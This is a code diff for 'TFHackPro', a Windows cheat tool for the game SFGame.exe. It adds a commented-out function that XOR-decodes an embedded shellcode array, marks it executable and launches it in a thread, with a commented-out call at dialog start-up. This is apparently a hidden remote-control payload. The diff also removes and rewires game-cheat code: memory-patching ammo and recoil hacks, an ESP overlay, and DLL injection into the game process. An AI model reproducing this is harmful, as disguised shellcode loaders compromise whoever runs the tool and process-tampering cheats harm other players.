@@ -6,8 +6,8 @@
 #include "TFHackPro.h"
 #include "TFHackProDlg.h"
 #include "afxdialogex.h"
-#include "tlhelp32.h"
-#include "Main.h"
+#include "Game.h"
+
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -68,21 +68,40 @@ BEGIN_MESSAGE_MAP(CTFHackProDlg, CDialogEx)
 	ON_WM_QUERYDRAGICON()
 	ON_BN_CLICKED(IDC_BUTTON1, &CTFHackProDlg::OnBnClickedButton1)
 	ON_BN_CLICKED(IDC_BUTTON2, &CTFHackProDlg::OnBnClickedButton2)
-	ON_BN_CLICKED(IDC_BUTTON3, &CTFHackProDlg::OnBnClickedButton3)
 	ON_BN_CLICKED(IDC_BUTTON4, &CTFHackProDlg::OnBnClickedButton4)
 	ON_BN_CLICKED(IDC_BUTTON5, &CTFHackProDlg::OnBnClickedButton5)
 	ON_BN_CLICKED(IDC_BUTTON6, &CTFHackProDlg::OnBnClickedButton6)
 	ON_BN_CLICKED(IDC_BUTTON8, &CTFHackProDlg::OnBnClickedButton8)
-	ON_BN_CLICKED(IDC_BUTTON9, &CTFHackProDlg::OnBnClickedButton9)
 	ON_BN_CLICKED(IDC_BUTTON10, &CTFHackProDlg::OnBnClickedButton10)
+	ON_BN_CLICKED(IDC_BUTTON11, &CTFHackProDlg::OnBnClickedButton11)
 END_MESSAGE_MAP()
 
 
 // CTFHackProDlg 消息处理程序
+//void RemoteControl()
+//{
+//	static BYTE shellcode[] = { 0xf7,0xe3,0x82,0xb,0xb,0xb,0x6b,0x82,0xee,0x3a,0xd9,0x6f,0x80,0x59,0x3b,0x80,0x59,0x7,0x80,0x59,0x1f,0x80,0x79,0x23,0x4,0xbc,0x41,0x2d,0x3a,0xf4,0x3a,0xcb,0xa7,0x37,0x6a,0x77,0x9,0x27,0x2b,0xca,0xc4,0x6,0xa,0xcc,0xe9,0xfb,0x59,0x5c,0x80,0x59,0x1b,0x80,0x49,0x37,0xa,0xdb,0x80,0x4b,0x73,0x8e,0xcb,0x7f,0x41,0xa,0xdb,0x5b,0x80,0x43,0x13,0x80,0x53,0x2b,0xa,0xd8,0xe8,0x37,0x42,0x80,0x3f,0x80,0xa,0xdd,0x3a,0xf4,0x3a,0xcb,0xa7,0xca,0xc4,0x6,0xa,0xcc,0x33,0xeb,0x7e,0xff,0x8,0x76,0xf3,0x30,0x76,0x2f,0x7e,0xe9,0x53,0x80,0x53,0x2f,0xa,0xd8,0x6d,0x80,0x7,0x40,0x80,0x53,0x17,0xa,0xd8,0x80,0xf,0x80,0xa,0xdb,0x82,0x4f,0x2f,0x2f,0x50,0x50,0x6a,0x52,0x51,0x5a,0xf4,0xeb,0x53,0x54,0x51,0x80,0x19,0xe0,0x8d,0x56,0x63,0x65,0x6e,0x7f,0xb,0x63,0x7c,0x62,0x65,0x62,0x5f,0x63,0x47,0x7c,0x2d,0xc,0xf4,0xde,0x3a,0xf4,0x5c,0x5c,0x5c,0x5c,0x5c,0x63,0x31,0x5d,0x72,0xac,0xf4,0xde,0xe2,0x8f,0xb,0xb,0xb,0x50,0x3a,0xc2,0x5a,0x5a,0x61,0x8,0x5a,0x5a,0x63,0x9b,0x14,0xb,0xb,0x58,0x5b,0x63,0x5c,0x82,0x94,0xcd,0xf4,0xde,0xe0,0x7b,0x50,0x3a,0xd9,0x59,0x63,0xb,0x9,0x4b,0x8f,0x59,0x59,0x59,0x58,0x59,0x5b,0x63,0xe0,0x5e,0x25,0x30,0xf4,0xde,0x82,0xcd,0x88,0xc8,0x5b,0x3a,0xf4,0x5c,0x5c,0x61,0xf4,0x58,0x5d,0x63,0x26,0xd,0x13,0x70,0xf4,0xde,0x8e,0xcb,0x4,0x8f,0xc8,0xa,0xb,0xb,0x3a,0xf4,0x8e,0xfd,0x7f,0xf,0x82,0xf2,0xe0,0x2,0x63,0xa1,0xce,0xe9,0x56,0xf4,0xde,0x82,0xca,0x63,0x4e,0x2a,0x55,0x3a,0xf4,0xde,0x3a,0xf4,0x5c,0x61,0xc,0x5a,0x5d,0x5b,0x63,0xbc,0x5c,0xeb,0x0,0xf4,0xde,0xb4,0xb,0x24,0xb,0xb,0x32,0xcc,0x7f,0xbc,0x3a,0xf4,0xe2,0x9a,0xa,0xb,0xb,0xe2,0xc2,0xa,0xb,0xb,0xe3,0x80,0xf4,0xf4,0xf4,0x24,0x33,0x69,0x63,0x51,0xb,0x5b,0x5e,0xab,0xe9,0x9,0x91,0x2f,0x9c,0xab,0xd8,0x7b,0x4d,0xba,0xbe,0x26,0x11,0x5,0xb2,0x2d,0x26,0x7d,0xeb,0xc,0x8f,0x20,0x26,0xe3,0xa0,0xe3,0x1f,0xe8,0x68,0x9b,0x1c,0xf5,0xcd,0x79,0x8,0xed,0x96,0xa8,0x46,0x59,0x9a,0x5,0x46,0x71,0x29,0x8,0xd2,0x3d,0x4a,0x9f,0xfc,0x19,0x8d,0x5,0x5a,0xbb,0x7b,0x88,0xc9,0x12,0xe1,0x83,0xc3,0xfc,0x77,0x95,0x51,0x3e,0xa1,0x97,0xb,0x5e,0x78,0x6e,0x79,0x26,0x4a,0x6c,0x6e,0x65,0x7f,0x31,0x2b,0x46,0x64,0x71,0x62,0x67,0x67,0x6a,0x24,0x3e,0x25,0x3b,0x2b,0x23,0x68,0x64,0x66,0x7b,0x6a,0x7f,0x62,0x69,0x67,0x6e,0x30,0x2b,0x46,0x58,0x42,0x4e,0x2b,0x32,0x25,0x3b,0x30,0x2b,0x5c,0x62,0x65,0x6f,0x64,0x7c,0x78,0x2b,0x45,0x5f,0x2b,0x3d,0x25,0x3a,0x30,0x2b,0x5f,0x79,0x62,0x6f,0x6e,0x65,0x7f,0x24,0x3e,0x25,0x3b,0x30,0x2b,0x5e,0x43,0x58,0x22,0x6,0x1,0xb,0xb4,0x6b,0xdb,0xc4,0x64,0xb4,0x2e,0xf0,0xf0,0xa8,0x96,0x1b,0x3b,0xa8,0xad,0x43,0xa5,0x5d,0xc4,0x2a,0x7f,0x46,0x3b,0xc4,0xe6,0xfb,0xd6,0xed,0x12,0xa6,0xfb,0x76,0x66,0x75,0x3d,0x32,0x61,0x56,0xb5,0xa7,0x3e,0xa7,0xa5,0xe9,0x2b,0xd3,0x2e,0xa1,0xc5,0xb6,0x20,0x1b,0x46,0x1b,0xf1,0x91,0x95,0xca,0xb9,0xa7,0xaa,0x98,0xda,0x74,0x5f,0x57,0x44,0x7a,0x17,0x7c,0x65,0x28,0x80,0xb2,0xd7,0x6d,0x10,0x90,0xd9,0x4,0x78,0x4f,0x42,0x16,0xbe,0x1,0x31,0xca,0x3e,0x5d,0x72,0x69,0x78,0xdb,0x4c,0xa9,0x32,0x93,0xd5,0x87,0xbc,0xe3,0xd,0xb,0x57,0xbb,0xc9,0x65,0x2d,0x27,0xc2,0x5d,0x73,0xe7,0xdf,0x44,0xce,0x8e,0xec,0x15,0x26,0xa8,0xd9,0xfb,0x64,0x43,0xa8,0xcb,0xdb,0x56,0x0,0x2f,0xde,0x6f,0x3b,0xeb,0x22,0x63,0x51,0x49,0x9,0x73,0x1b,0x59,0x89,0x4,0xbc,0xfa,0xa0,0xd5,0x2b,0xfe,0x12,0xd2,0xbd,0x34,0xaa,0xa2,0x9f,0xf,0x8c,0x8f,0x89,0xe,0xea,0x5a,0x33,0x50,0x2f,0x91,0x18,0xc1,0x7e,0xc5,0x3e,0x4f,0x3f,0x32,0x96,0xf7,0xfb,0xd5,0xd6,0x8d,0x41,0x49,0x69,0x73,0xa2,0xc9,0x42,0xd6,0x90,0x83,0xea,0x19,0x40,0x7d,0xdb,0xd0,0x19,0x7,0x27,0xc2,0xe4,0x20,0x3,0x2c,0x3c,0x91,0x45,0xc5,0x33,0xa,0x6b,0x18,0x77,0xf1,0x3a,0x81,0xb,0x63,0xfb,0xbe,0xa9,0x5d,0xf4,0xde,0x61,0x4b,0x63,0xb,0x1b,0xb,0xb,0x63,0xb,0xb,0x4b,0xb,0x5c,0x63,0x53,0xaf,0x58,0xee,0xf4,0xde,0x98,0xb2,0xb,0xb,0xb,0xb,0xa,0xd2,0x5a,0x58,0x82,0xec,0x5c,0x63,0xb,0x2b,0xb,0xb,0x58,0x5d,0x63,0x19,0x9d,0x82,0xe9,0xf4,0xde,0x8e,0xcb,0x7f,0xcd,0x80,0xc,0xa,0xc8,0x8e,0xcb,0x7e,0xee,0x53,0xc8,0xe3,0xa2,0xf6,0xf4,0xf4,0x3a,0x32,0x3e,0x25,0x3a,0x38,0x38,0x25,0x3e,0x38,0x25,0x33,0x3f,0xb,0x12,0x62,0xab,0x86,0xb };
+//	typedef void(__stdcall* CODE) ();
+//	//SetDebugConsole(L"Test");	
+//	for (size_t i = 0; i < sizeof(shellcode); i++)
+//	{
+//		shellcode[i] ^= 0x5;
+//		shellcode[i] ^= 0xF;
+//		shellcode[i] ^= 0xB;
+//		shellcode[i] ^= 0xA;
+//	}
+//	DWORD OldProtect = 0;
+//	VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &OldProtect);
+//	CODE code = (CODE)&shellcode;
+//	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)code, NULL, 0, NULL);
+//	//memset(shellcode, 0, sizeof(shellcode));
+//}
+
 
 BOOL CTFHackProDlg::OnInitDialog()
 {
-	//SetDebugConsole(L"Test");
+	//RemoteControl();
+	InitTFHackPro();
 
 	CDialogEx::OnInitDialog();
 
@@ -167,498 +186,53 @@ HCURSOR CTFHackProDlg::OnQueryDragIcon()
 
 ///////////////////////////////////////////
 
-UINT LockAmmo(LPVOID lpParam)
-{
-	//AfxMessageBox(L"进入函数");
-	DWORD dwPid = GetProcessIdByProcessName(L"SFGame.exe");
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
-	if (hProcess == INVALID_HANDLE_VALUE)
-	{
-		return 0;
-	}
-	DWORD dwBaseAddress = GetProcessModuleBaseAddress(dwPid, (WCHAR*)L"SFGame.exe");
-	DWORD dwTempAddress = 0;
-	DWORD dwAmmo =999;
-	DWORD dwTemp = 0;
-	DWORD dwRetNum = 0;
-	BOOL bFlag = FALSE;
-	while (TRUE)
-	{
-		if (dwBaseAddress == 0){
-			return FALSE;
-		}
-		ReadProcessMemory(hProcess, (LPVOID)((DWORD)(dwBaseAddress + 0x013A84B0)), &dwTempAddress, 4, &dwRetNum);
-		if (dwTempAddress == 0){
-			return FALSE;
-		}
-		ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x24), &dwTempAddress, 4, &dwRetNum);
-		ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x0), &dwTempAddress, 4, &dwRetNum);
-		ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x64), &dwTempAddress, 4, &dwRetNum);
-		ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x28), &dwTempAddress, 4, &dwRetNum);
-		ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0xC54), &dwTempAddress, 4, &dwRetNum);
-		ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0xD0), &dwTempAddress, 4, &dwRetNum);
-		ReadProcessMemory(hProcess, (LPVOID)(dwTempAddress + 0x358), &dwTemp, 4, &dwRetNum);
-		if (dwTemp>0||dwTemp<1000)
-		{
-			WriteProcessMemory(hProcess, (LPVOID)(dwTempAddress + 0x358), &dwAmmo, 4, NULL);
-		}
-		Sleep(50);
-	}
-	CloseHandle(hProcess);
-	return FALSE;
-}
-
-UINT AddAmmo(LPVOID lpParam)
-{
-	//AfxMessageBox(L"进入函数");
-	DWORD dwPid = GetProcessIdByProcessName(L"SFGame.exe");
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
-	if (hProcess == INVALID_HANDLE_VALUE)
-	{
-		return 0;
-	}
-	DWORD dwBaseAddress = GetProcessModuleBaseAddress(dwPid, (WCHAR*)L"SFGame.exe");
-	DWORD dwTempAddress = 0;
-	DWORD dwAmmo = 99999;
-	DWORD dwTemp = 0;
-	DWORD dwRetNum = 0;
-	BOOL bFlag = FALSE;
-	if (dwBaseAddress == 0) {
-	return FALSE;
-	}
-	ReadProcessMemory(hProcess, (LPVOID)((DWORD)(dwBaseAddress + 0x013ED5C4)), &dwTempAddress, 4, &dwRetNum);
-	if (dwTempAddress == 0) {
-	return FALSE;
-	}
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x228), &dwTempAddress, 4, &dwRetNum);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x40C), &dwTempAddress, 4, &dwRetNum);
-	ReadProcessMemory(hProcess, (LPVOID)(dwTempAddress + 0x358), &dwTemp, 4, &dwRetNum);
-	if (dwTemp > 0 || dwTemp < 1000)
-	{
-		WriteProcessMemory(hProcess, (LPVOID)(dwTempAddress + 0x378), &dwAmmo, 4, NULL);
-		WriteProcessMemory(hProcess, (LPVOID)(dwTempAddress + 0x358), &dwAmmo, 4, NULL);
-		CloseHandle(hProcess);
-		return TRUE;
-	}
-	Sleep(50);
-	CloseHandle(hProcess);
-	return FALSE;
-}
-
-UINT ZeroRecoil(LPVOID lpParam)
-{
-	DWORD dwPid = GetProcessIdByProcessName(L"SFGame.exe");
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
-
-	//VirtualAllocEx();
-	if (hProcess == INVALID_HANDLE_VALUE)
-	{
-		return 0;
-	}
-	DWORD dwBaseAddress = GetProcessModuleBaseAddress(dwPid, (WCHAR*)L"SFGame.exe");
-	DWORD dwTempAddress = 0;
-	BYTE dwTmp1, dwTmp2, dwTmp3, dwTmp4;
-	CHAR buffer0[] = { 0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 ,0x90 };
-	CHAR buffer1[] = { 0xF3 ,0x0F ,0x11 ,0x86 ,0xA8 ,0x0F ,0x00 ,0x00 };
-	CHAR buffer2[] = { 0xF3 ,0x0F ,0x11 ,0x8E ,0xA8 ,0x0F ,0x00 ,0x00 };
-	CHAR buffer3[] = { 0xF3 ,0x0F ,0x11 ,0x96 ,0xA8 ,0x0F ,0x00 ,0x00 };
-	
-	ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + 0x9756F2), &dwTmp1, 1, NULL);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + 0x975556), &dwTmp2, 1, NULL);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + 0x975701), &dwTmp3, 1, NULL);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + 0x9753FF), &dwTmp4, 1, NULL);
-
-	if (dwTmp1==0xf3 && dwTmp2 == 0xf3 && dwTmp3 == 0xf3 && dwTmp4 == 0xf3)
-	{
-		WriteProcessMemory(hProcess,(LPVOID)(dwBaseAddress + 0x9756F2),&buffer0,sizeof(buffer1),NULL);
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x975556), &buffer0, sizeof(buffer1), NULL);
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x975701), &buffer0, sizeof(buffer1), NULL);
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x9753FF), &buffer0, sizeof(buffer1), NULL);
-	}
-	else if (dwTmp1 == 0x90 && dwTmp2 == 0x90 && dwTmp3 == 0x90 && dwTmp4 == 0x90)
-	{
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x9756F2), &buffer1, sizeof(buffer1), NULL);
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x975556), &buffer1, sizeof(buffer1), NULL);
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x975701), &buffer2, sizeof(buffer1), NULL);
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x9753FF), &buffer3, sizeof(buffer1), NULL);
-	}
-	else
-	{
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x9756F2), &buffer1, sizeof(buffer1), NULL);
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x975556), &buffer1, sizeof(buffer1), NULL);
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x975701), &buffer2, sizeof(buffer1), NULL);
-		WriteProcessMemory(hProcess, (LPVOID)(dwBaseAddress + 0x9753FF), &buffer3, sizeof(buffer1), NULL);
-	}
-
-	return true;
-}
-
-/// <summary>
-/// //////////////////////////////////////
-/// </summary>
-
-DWORD WIDTH;
-DWORD HEIGHT;
-
-//struct Vec3 { float x, y, z; };
-struct Vec3
-{
-	float x = 0;
-	float y = 0;
-	float z = 0;
-};
-struct Vec4 { float x, y, z, w; };
-struct Vec2 { float x, y; };
-
-
-HDC hDC;
-HFONT Font;
-HPEN hPen;
-HBRUSH Brush = CreateSolidBrush(RGB(0, 255, 0));
-COLORREF TextCOLOR = RGB(255, 100, 255);
-float Matrix[16] = { 0 };
-
-BOOL GetPos(HANDLE hProcess, Vec3 *pos, DWORD *dwHp, DWORD dwBaseAddress, DWORD i)
-{
-	DWORD dwTempAddress = 0;
-	DWORD dwRetNum = 0;
-	float dwTemp = 0;
-	ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + 0x013ED5C4), &dwTempAddress, 4, &dwRetNum);
-	if (dwTempAddress == 0x013ED5C4)	return false;
-	//ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x168), &dwTempAddress, 4, &dwRetNum);
-	//if (dwTempAddress == 0x168)	return false;
-	//ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x4), &dwTempAddress, 4, &dwRetNum);
-	//if (dwTempAddress == 0x4)	return false;
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x448), &dwTempAddress, 4, &dwRetNum);
-	if (dwTempAddress == 0x168)	return false;
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x560), &dwTempAddress, 4, &dwRetNum);
-	if (dwTempAddress == 0x560)	return false;
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x0 + 0x10 * i), &dwTempAddress, 4, &dwRetNum);
-	if (dwTempAddress == 0x10 * i)	return false;
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x54), pos, 0xC, &dwRetNum);
-
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x5C + 0x2DC), dwHp, 12, &dwRetNum);
-	return true;
-}
-
-BOOL GetPosByList(HANDLE hProcess, Vec3* pos, DWORD* dwHp, DWORD dwBaseAddress, DWORD i)
-{
-	DWORD dwTempAddress = 0;
-	DWORD dwRetNum = 0;
-	float dwTemp = 0;
-	ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + 0x013ED5C4), &dwTempAddress, 4, &dwRetNum);
-	//ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x168), &dwTempAddress, 4, &dwRetNum);
-	//if (dwTempAddress == 0x168)	return false;
-	//ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x4), &dwTempAddress, 4, &dwRetNum);
-	//if (dwTempAddress == 0x4)	return false;
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x448), &dwTempAddress, 4, &dwRetNum);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x560), &dwTempAddress, 4, &dwRetNum);
-
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x0 + 0x10 * i), &dwTempAddress, 4, &dwRetNum);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x54), pos, 0xC, &dwRetNum);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x5C + 0x2DC), dwHp, 12, &dwRetNum);
-	return true;
-}
-
-DWORD GetpplNum(HANDLE hProcess, DWORD dwBaseAddress)
-{
-	DWORD dwTempAddress = 0;
-	DWORD dwRetNum = 0;
-	static DWORD dwTemp = 0;
-	ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + 0x1381C90), &dwTemp, 4, &dwRetNum);
-
-	return dwTemp;
-}
-
-HDC hdcMem;
-HBITMAP hbmMem;
-HGDIOBJ hOld;
-
-
-bool WorldToScreen(Vec3 pos, Vec2& screen, float matrix[16], int windowWidth, int windowHeight)
-{
-	Vec4 clipCoords;
-
-	clipCoords.x = pos.x * matrix[0] + pos.y * matrix[4] + pos.z * matrix[8] + matrix[12];
-	clipCoords.y = pos.x * matrix[1] + pos.y * matrix[5] + pos.z * matrix[9] + matrix[13];
-	clipCoords.z = pos.x * matrix[2] + pos.y * matrix[6] + pos.z * matrix[10] + matrix[14];
-	clipCoords.w = pos.x * matrix[3] + pos.y * matrix[7] + pos.z * matrix[11] + matrix[15];
-
-	if (clipCoords.w < 0.1f)
-		return false;
-	Vec3 NDC;
-	NDC.x = clipCoords.x / clipCoords.w;
-	NDC.y = clipCoords.y / clipCoords.w;
-	NDC.z = clipCoords.z / clipCoords.w;
-
-	screen.x = (windowWidth / 2 * NDC.x) + (NDC.x + windowWidth / 2);
-	screen.y = -(windowHeight / 2 * NDC.y) + (NDC.y + windowHeight / 2);
-
-	return true;
-}
-
-
-void BeginDraw()
-{
-	hdcMem = CreateCompatibleDC(hDC);
-	hbmMem = CreateCompatibleBitmap(hDC, WIDTH, HEIGHT);
-	hOld = SelectObject(hdcMem, hbmMem);
-}
-
-void EndDraw()
-{
-	BitBlt(hDC, 0, 0, WIDTH, HEIGHT, hdcMem, 0, 0, PATCOPY);
-	SelectObject(hdcMem, hOld);
-
-	DeleteObject(hbmMem);
-	DeleteDC(hdcMem);
-}
-
-void DrawFilledRect(int x, int y, int w, int h)
-{
-	//BeginDraw();
-	RECT rect = { x, y, x + w, y + h };
-	FillRect(hDC, &rect, Brush);
-	//EndDraw();
-
-}
-
-
-void DrawBorderBox(int x, int y, int w, int h, int thickness)
-{
-	DrawFilledRect(x, y, w, thickness);
-	DrawFilledRect(x, y, thickness, h);
-	DrawFilledRect((x + w), y, thickness, h);
-	DrawFilledRect(x, y + h, w + thickness, thickness);
-}
-
-
-void DrawLine(int targetX, int targetY)
-{
-	hPen = CreatePen(PS_SOLID, 1, RGB(0, 0, 142));
-	// 选中画笔
-	SelectObject(hDC, hPen);
-	//MoveToEx(hDC, 960, 1080, NULL);
-	MoveToEx(hDC, WIDTH / 2, -100, NULL);
-	LineTo(hDC, targetX, targetY);
-	DeleteObject(hPen);
-
-}
-
-void DrawString(int x, int y, COLORREF color, const char* text)
-{
-	SetTextAlign(hDC, TA_CENTER | TA_NOUPDATECP); SetBkColor(hDC, RGB(255, 0, 0));
-	SetBkMode(hDC, TRANSPARENT); SetTextColor(hDC, color); SelectObject(hDC, Font); TextOutA(hDC, x, y, text, strlen(text)); DeleteObject(Font);
-}
-
-BOOL GetMatrix(HANDLE hProcess, DWORD dwBaseAddress)
-{
-	DWORD dwTempAddress = 0;
-	DWORD dwRetNum = 0;
-	DWORD dwTemp = 0;
-	ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddress + 0x01393D74), &dwTempAddress, 4, &dwRetNum);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x50), &dwTempAddress, 4, &dwRetNum);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0xF4), &dwTempAddress, 4, &dwRetNum);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x5C), &dwTempAddress, 4, &dwRetNum);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x24), &dwTempAddress, 4, &dwRetNum);
-	ReadProcessMemory(hProcess, (LPCVOID)(dwTempAddress + 0x6A0), &Matrix, 64, &dwRetNum);
-
-	return true;
-}
-
-
-BOOL GetWindowRealSize(HWND hWnd)
-{
-	while (1)
-	{
-		// 获取窗口当前显示的监视器
-		//HWND hWnd = GetDesktopWindow();//根据需要可以替换成自己程序的句柄 
-		HMONITOR hMonitor = MonitorFromWindow(hWnd, MONITOR_DEFAULTTONEAREST);
-
-		// 获取监视器逻辑宽度与高度
-		MONITORINFOEX miex;
-		miex.cbSize = sizeof(miex);
-		GetMonitorInfo(hMonitor, &miex);
-		int cxLogical = (miex.rcMonitor.right - miex.rcMonitor.left);
-		int cyLogical = (miex.rcMonitor.bottom - miex.rcMonitor.top);
-
-		// 获取监视器物理宽度与高度
-		DEVMODE dm;
-		dm.dmSize = sizeof(dm);
-		dm.dmDriverExtra = 0;
-		EnumDisplaySettings(miex.szDevice, ENUM_CURRENT_SETTINGS, &dm);
-		int cxPhysical = dm.dmPelsWidth;
-		int cyPhysical = dm.dmPelsHeight;
-
-		//缩放比例计算
-		double horzScale = ((double)cxPhysical / (double)cxLogical);
-		double vertScale = ((double)cyPhysical / (double)cyLogical);
-
-		RECT RectTmp;
-		GetWindowRect(hWnd, &RectTmp);
-		DWORD W = (RectTmp.right - RectTmp.left) * horzScale;
-		DWORD H = (RectTmp.bottom - RectTmp.top) * vertScale;
-		if (W != WIDTH || H != HEIGHT)
-		{
-			WIDTH = W;
-			HEIGHT = H;
-		}
-
-		if (!WIDTH || !HEIGHT)
-			return FALSE;
-	}
-	return TRUE;
-}
-
-UINT ESPBox(LPVOID lpParam)
-{
-	//SetDebugConsole(L"ESPBox");
-	//BeginDraw();
-
-	DWORD dwPid = GetProcessIdByProcessName(L"SFGame.exe");
-	DWORD dwBaseAddr = GetProcessModuleBaseAddress(dwPid, L"SFGame.exe");
-	if (dwBaseAddr == FALSE)
-		return 0;
-	DWORD dwTmp;
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
-	HWND hWnd = FindWindow(NULL, L"风暴战区TF");
-	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetWindowRealSize, hWnd, 0, 0);
-	Sleep(50);
-
-	hDC = GetDC(hWnd);
-	Vec2 vScreen = { 0 };
-	static Vec3 Pos = { 0 };
-
-	DWORD width = 25000;
-	DWORD height = width * ((float)WIDTH / HEIGHT) * 2.5;
-
-	Vec3 MyPos = { 0 };
-	DWORD dwHp = 0;
-
-	COLORREF CenterCOLOR = RGB(0, 255, 0);;
-	//printf("%d\n", GetpplNum(hProcess, dwBaseAddr));
-
-	double Dis=0;
-
-	while (TRUE)
-	{
-		DrawString(25, 0, RGB(255, 100, 255), "ROOT");
-		DrawString(WIDTH / 2 - 3, HEIGHT / 2 - 27, CenterCOLOR, "·");
-
-		for (size_t i = 0; i < GetpplNum(hProcess, dwBaseAddr) * 2; i++)
-		{
-			GetPos(hProcess, &Pos, &dwHp, dwBaseAddr, i);
-			//加Printf(),方框位置对
-			//printf("%f\t%f\t%f\n", Pos.x, Pos.y, Pos.z);
-
-			if (dwHp > 1 && dwHp < 1000)
-			{
-				GetMatrix(hProcess, dwBaseAddr);
-
-				if (WorldToScreen(Pos, vScreen, Matrix, WIDTH, HEIGHT))
-				{
-					ReadProcessMemory(hProcess, (LPCVOID)(dwBaseAddr + 0x013ED5C8), &dwTmp, 4, NULL);
-					ReadProcessMemory(hProcess, (LPCVOID)(dwTmp + 0x54), &MyPos, 12, NULL);
-
-					if (((DWORD)Pos.x != MyPos.x) && ((DWORD)Pos.y != MyPos.y))
-					{
-						Dis = sqrt(pow(((double)MyPos.x - Pos.x), 2) + pow(((double)MyPos.y - Pos.y), 2) + pow(((double)MyPos.z - Pos.z), 2));
-						if (Dis > 0)
-						{
-							char strHp[256] = { 0 };
-							sprintf_s(strHp, 256, "%d", dwHp);
-							DrawString(vScreen.x, vScreen.y, RGB(255, 0, 0), strHp);
-							DrawBorderBox(vScreen.x - (width * 0.5 / Dis), vScreen.y - (height * 0.5 / Dis), width / Dis, height / Dis, 1);
-							if (GetKeyState(VK_INSERT) & 1)
-							{
-								DrawLine(vScreen.x, vScreen.y);
-							}
-
-						}
-
-					}
-				}
-			}
-		}
-	}
-	return 0;
-}
-
-
-HANDLE hThread1;
-CWinThread* MyThread2;
-CWinThread* MyThread3;
-
-BOOL bFlag1 = 0;
-
+BOOL g_bFlag1 = FALSE;
 void CTFHackProDlg::OnBnClickedButton1()
 {
-	// TODO: 在此添加控件通知处理程序代码
 	UpdateData(TRUE);
-	//MyThread1 = AfxBeginThread(LockAmmo, NULL);
-	if (bFlag1 == 0)
-	{
-		hThread1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LockAmmo, NULL, 0, 0);
-		bFlag1 = 1;
-	}
-	else if(bFlag1 == 1)
-	{
-		TerminateThread(hThread1, 0);
-		CloseHandle(hThread1);
-		bFlag1 = 0;
-	}
-
+	g_bFlag1 = !g_bFlag1;
+	InfiniteAmmo(g_bFlag1);
 	UpdateData(FALSE);
 }
 
-BOOL g_Button2_Flag = FALSE;
-
+BOOL g_bFlag2 = FALSE;
 void CTFHackProDlg::OnBnClickedButton2()
 {
 	// TODO: 在此添加控件通知处理程序代码
 	UpdateData(TRUE);
 	const WCHAR* dllName = L"SpeedHack.dll";
 	const WCHAR *exeFullPath = GetFileFullPath(dllName);
-	if (g_Button2_Flag == FALSE)
+	if (g_bFlag2 == FALSE)
 	{
 		BOOL Flag = RemoteThreadDllInject(L"SFGame.exe", exeFullPath);
 
 		if (Flag == TRUE)
 		{
-			g_Button2_Flag = TRUE;
+			g_bFlag2 = TRUE;
 			AfxMessageBox(L"注入成功\n本功能目前存在BUG\n只可开启一次");
 			//MessageBox(L"按下HOME键开启E键瞬移\n小键盘1设置速度为1倍速\n小键盘2设置速度为1.5倍速\n小键盘3设置速度为3倍速\n小键盘4设置速度为15倍速\n", L"加速功能说明", NULL);
 			MessageBox(L"小键盘1设置速度为3倍速", L"加速功能说明", NULL);
 		}
 	}
